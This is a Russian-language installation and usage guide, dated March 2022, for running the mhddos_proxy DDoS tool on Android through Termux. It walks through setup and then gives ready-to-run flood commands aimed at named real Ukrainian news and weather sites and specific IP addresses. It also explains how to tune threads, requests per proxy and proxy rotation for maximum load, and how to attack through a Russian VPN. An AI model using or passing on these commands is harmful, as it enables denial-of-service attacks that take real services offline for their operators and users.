
<h1 align="center">mhddos_proxy for Android with Termux</h1>  
March 31, 2022

Windows / Linux / Mac / Android: [ссылка!](https://github.com/BionecX/mhddos_p/blob/main/docs/installation.md)


[Анализ средства mhddos_proxy (что он выводит, и все его преимущества)](https://github.com/BionecX/mhddos_p_docs/blob/main/docs/README_analiz_sredstva_mhddos_h.md#%D0%B0%D0%BD%D0%B0%D0%BB%D0%B8%D0%B7-%D1%81%D1%80%D0%B5%D0%B4%D1%81%D1%82%D0%B2%D0%B0-mhddos_proxy) 


Если возникли какие-либо проблемы/вопросы – пишите мне в личные:
 (телеграм)

!!! СКАЧИВАТЬ НАДО САМОЕ APK НА GITHUB, В GOOGLE PLAY НЕ ПОДОЙТЕ (потому что там больше не поддерживается – будут ошибки)!!!

https://github.com/termux/termux-app/releases - выбираете: termux-app_v0.118.0+github-debug_universal.apk и скачиваете


!!!ПРИ УСТАНОВКЕ НАДО ДАТЬ ВСЕ РАЗРЕШЕНИЯ ПРОГРАММЕ!!!


## 1) Установка:   

  1. `apt update && apt upgrade -y`  
      (в процессе выполнения команды вам нужно будет пару раз прописать Y, чтобы подвергнуть обновлению, поэтому
      следите внимательно)    
  2. `pkg install python -y && pkg install rust -y && pkg install git -y`     
  3. `pip install --upgrade pip`      
  4. `cd ~`     
  5. `Здесь специфически зависит от архитектуры процессора.`  
      Но выставил вам скажем так приоритет, если вы не знаете какая у вас архитектура, то пробуйте устанавливать   
      это изменение перебирая мой приоритет до пока установки не будет успешным.

Приоритеты:

    export CARGO_BUILD_TARGET=aarch64-linux-android
    export CARGO_BUILD_TARGET=arm-linux-androideabi
    export CARGO_BUILD_TARGET=armv7-linux-androideabi
    export CARGO_BUILD_TARGET=i686-linux-android
    export CARGO_BUILD_TARGET=thumbv7neon-linux-androideabi
    export CARGO_BUILD_TARGET=x86_64-linux-android
    

   5.1. `export CARGO_BUILD_TARGET={архитектура процессора}`

У одного админа выглядит так:    
export CARGO_BUILD_TARGET=aarch64-linux-android   
В остальном так:  
export CARGO_BUILD_TARGET=x86_64-linux-android

!!! ЕСЛИ ВЫ ВЫБЕРЕТЕ НЕ ТУ АРХИТЕКТУРУ ТО НА ПУНКТЕ 12-13 БУДЕТ ОШИБКА ПРИ ЗАПУСКУ АТАКИ - РЕШЕНИЯ: ДАЛЬШЕ ПЕРЕБИРАТЬ АРХИТЕКТУРЫ (начиная с пункта 4)!!!

6. `termux-setup-storage`
7. `pkg install git -y`
8. `cd storage/shared` 
9. `rm -r mhddos_p`

Может выдать такое, но это норм – идите дальше:
rm: cannot remove 'mhddos_proxy': No such file or directory
или просто ничего не выдаст – идите дальше

10. `git clone https://github.com/BionecX/mhddos_p.git`
11. `cd mhddos_p`
12. `pip install -r requirements.txt`
13. 

        python runner.py https://znaj.ua https://www.gismeteo.ua https://24tv.ua -t 1000 --rpc 1000 --http-methods GET STRESS --debug


Если после перебора всех архитектур ничего не вышло, идите [сюда](https://github.com/BionecX/mhddos_p_docs/blob/main/docs/ph_MHDDoS-Proxy-Termux-04-05.md) 


    Для DDoS с Android -t желательно не должно превышать 1000, а --rpc не более 1000


Готово теперь после полного закрытия Термукса, чтобы начать новую атаку надо:

![https://github.com/BionecX/mhddos_p_docs/blob/main/images/ph_mhddos-proxy-install-on-Linux-with-terminal-03-31_1.png](https://github.com/BionecX/mhddos_p_docs/blob/main/images/ph_mhddos-proxy-install-on-Linux-with-terminal-03-31_1.png)

## 2) Запуск команд

1. Открыть Termux через иконку на главном экране

2. Зайти в папку с mhddos_proxy – нужно ввести:

    `cd storage/shared/mhddos_p`

3. Обновить скрипт:

    `git pull origin main`

4. Скачать новые зависимости:

    `pip install -r requirements.txt`

5. Запустить атаку:

       python runner.py https://znaj.ua https://www.gismeteo.ua https://24tv.ua -t 1000 --rpc 1000 --http-methods GET STRESS --debug

## 3) Шаблон команды

   `python runner.py https://znaj.ua https://www.gismeteo.ua https://24tv.ua -t 1000 --rpc 1000 --http-methods GET STRESS --debug`


   python runner.py <Цели-сайты> --http-methods <Методы> -t <Потоки> --rpc <Подключение> -p <Обновление> --debug


* Цели-сайты – цели при проведении атаки на одном уровне и с использованием одного метода атаки, указанного в --http-methods, можно перечислять через пробел. В этом случае количество целей будет разделено на каждый метод равномерно от того количества, которое вы указали. 
* python – оболочка/приложение, которая будет читать и выполнять код программ runner.py
* runner.py – сам скрипт атаки
* Можно указывать в одной команде любые типы портов, например: http://, https://, tcp://, udp:// – все они будут разбиты на нужные методы, для http и https будут браться методы из перечня --http-methods , а для tcp и udp всегда используются методы TCP и UDP соответственно
* Метод - Со всеми методами можно ознакомиться на самом [гитхабе](https://github.com/MHProDev/MHDDoS#features-and-methods). Все команды, которые мы готовим в нашем канале – мы готовим уже с необходимыми для атаки методами. На одном уровне атаки методы можно перечислять через пропуск. Самые распространенные методы: 
    `--http-methods GET STRESS`
* Потоки – это количество "вредных" пакетов/запросов в количестве t * количество_ядер, отправляемых на цель. Здесь можно выкручивать по максимуму на столько, на сколько тянет ваш ПК (мониторите нагрузку в диспетчере задач, смотрим на ЦПУ и ОЗУ, в Kali Linux это зеленый и синий график соответственно). Будьте внимательны, в начале атаки нагрузка может быть минимальной, а спустя некоторое время зашкаливать. Учитывайте, что при увеличении пакетов/угрозов количество прокси-серверов может снизиться. По умолчанию 1000, по желанию - сколько влезет в вашу машину(но не больше 6000): В этой команде: `-t 1000` (для Termux не больше 1000)
* Подключение – здесь указываем предполагаемое количество подключений одного прокси-сервера. Оптимально указывать от 1000 до 2000. Предположим, что у вас 1000 прокси-серверов, при указании подключений в количестве 1000, вы отправите 1 000 000 пакетов на вашу цель (в идеале, но определенный процент пакетов скорее всего может потеряться). Теперь оптимальное значение: 
    `--rpc 1000`
* Период атаки - Значение указывается в секундах, по умолчанию это 300 секунд и это означает, что каждые 300 секунд вы будете обновлять список прокси-серверов и будете подключаться к ним (некоторые прокси могли забанить или соединение с ними может быть потеряно). Скрипт перезапускается автоматически, рекомендует указывать здесь не более 20 минут (1200), потому что чем будут чаще обновляться прокси, в разумных пределах, тем лучше.
    Пример оптимального обновления: `-p 3600`
* Также если вы подключены к VPN России можно добавить параметр --vpn , с помощью которого атака будет происходить напрямую из-под вашего IP, но тогда нужно переподключать VPN каждые 10-20 минут. 

  Например: 
  
      python3 runner.py https://172.67.147.246:443 http://172.67.164.142:80 https://213.59.253.7:443 -t 2000 -p 1200 --rpc 1000 --http-methods GET STRESS --debug --vpn

 
